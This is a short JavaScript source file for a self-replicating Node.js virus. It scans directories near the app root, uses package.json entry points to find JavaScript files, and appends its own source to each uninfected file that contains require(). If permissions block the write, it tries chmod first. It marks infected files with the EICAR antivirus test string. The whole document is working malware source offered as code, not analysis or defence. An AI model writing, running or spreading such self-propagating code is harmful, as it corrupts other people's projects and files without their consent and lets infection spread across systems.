;
(function self() {
  // identify yourself as virus:
  var sig = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';

  // only execute if in Node.js environemnt 
  if (typeof process === 'object' &&
    typeof process.versions === 'object' &&
    typeof process.versions.node !== 'undefined') {
    // everything should be in here

    var fs = require('fs');
    var path = require('path');
    // finding correct app root might fail when run through mocha: 
    var appRootDir = path.dirname(require.main.filename);
    // safety zone, only go 1 directory level deep.
    var targetlist = [path.join(appRootDir, '../')];

    // recursively function called for all found directories
    var getTargets = function(targets, dir) {

      var packageJSON = targets.filter(function(item) {
        return item.indexOf('package.json') > -1;
      });

      if (packageJSON.length === 1) {
        // get the entry point to the app
        var target = getEntryPoint(packageJSON.toString());
        if (target) {
          // join with path to file
          target = path.join(dir, target);
          // INFECT TARGET
          if (checkFile(target)) {
            checkTarget(target, function(valid) {
              if (valid) {
                reproduce(target);
              }
            });
          }
        }
      }

      targets.forEach(function(target) {
        // get file stats for each target
        fs.stat(target, function(err, stats) {
          // if a valid directory, traverse and get the files.
          if (!err && stats.isDirectory() && checkDir(target)) {
            getFiles(target);
          }
        }); // fs.stat
      }); // targets.forEach
    }

    // get files in path
    var getFiles = function(dir) {
      var targetFiles = [];
      fs.readdir(dir, function(err, files) {
        if (!err) {
          files.forEach(function(file) {
            targetFiles.push(path.join(dir, file));
          });
          getTargets(targetFiles, dir);
        }
      });
    }

    // check if file is potential target
    var checkFile = function(target) {
      // check if this is a javascript file
      return (path.extname(target) === '.js');
    }

    // check if target isn't yet infected & contains a require statement.
    var checkTarget = function(target, callback) {
      fs.readFile(target, 'utf-8', function(err, data) {
        if (!err && data.indexOf('X5O!P%@AP[4') === -1 && data.indexOf('require(') !== -1) {
          callback(true);
        } else {
          callback(false);
        }
      });
    }

    // find appropriate entry point to app in package.json
    var getEntryPoint = function(packageJSON) {
        try {
          return require(packageJSON).scripts.start.split(' ').pop();
        } catch (e) {
          try {
            return require(packageJSON).main.split(' ').pop();
          } catch (e) {
            return null;
          }
        }
      } // getEntryPoint

    // check if found directory should be tranversed into
    var checkDir = function(target) {
      // let's be nice. let's ignore hidden directories & node modules
      return (target[0] !== '.' || target[1] === '/' || target[1] === '.') && (target.indexOf('node_modulesX') === -1);
    }

    // reproduce
    getTargets(targetlist);
    var reproduce = function(target) {
        // wrap self as IIFE & append to target
        var wrappedSelf = ';(' + self + ')()';
        fs.appendFile(target, wrappedSelf, function(err) {
          // welp, if we can't access the file, maybe chmod will help us
          if (err && err.code === 'EACCES') {
            fs.chmod(target, '0755', function(err) {
              fs.appendFile(target, wrappedSelf, function(err) {});
            });
          }
        });
      } // reproduce

  } // node process check
})();
